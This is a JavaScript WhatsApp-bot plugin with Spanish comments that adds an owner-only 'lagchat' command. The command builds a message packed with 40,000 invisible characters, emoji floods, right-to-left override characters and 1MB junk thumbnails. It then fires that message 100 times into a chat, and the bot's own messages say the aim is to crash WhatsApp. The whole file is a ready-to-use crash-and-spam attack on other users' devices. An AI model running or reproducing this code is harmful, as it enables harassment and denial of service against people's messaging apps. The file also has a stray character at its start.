qconst buildLagMessage = () => ({
  imageMessage: {
    mimetype: 'image/jpeg',
    caption: '\u2063'.repeat(40000) + '💀'.repeat(2000) + '\u202E'.repeat(1000), // invisible + RTL + emojis
    jpegThumbnail: Buffer.alloc(1024 * 1024, 0), // 1MB basura
    contextInfo: {
      forwardingScore: 9999,
      isForwarded: true,
      mentionedJid: [],
      externalAdReply: {
        title: '💣 Mensaje Crítico',
        body: 'Saturación total del sistema',
        mediaType: 1,
        thumbnail: Buffer.alloc(1024 * 1024, 1), // basura visual
        renderLargerThumbnail: true,
        showAdAttribution: true,
        sourceUrl: 'https://wa.me/0'
      }
    }
  }
})

let handler = async (m, { conn, isOwner }) => {
  if (!isOwner) throw '⛔ Este comando es exclusivo del Owner.'

  const jid = m.chat
  const times = 100 // ¡máximo abuso!

  await m.reply('🚨 *MODO ULTRA OOGENT ACTIVADO* 🚨\n💥 Enviando spam masivo destructivo...\n❗ Esto puede cerrar WhatsApp al instante.')

  for (let i = 0; i < times; i++) {
    try {
      // Enviar sin esperar (más rápido)
      conn.sendMessage(jid, buildLagMessage(), { ephemeralExpiration: 0 })
    } catch (error) {
      console.error(`❌ Error en la bomba ${i + 1}:`, error)
    }
  }

  await m.reply('✅ *Ataque OOGENT completado.* ¿Todavía sigues vivo? 😈')
}

handler.command = /^lagchat$/i
handler.owner = true
handler.tags = ['owner']
handler.help = ['lagchat']

export default handler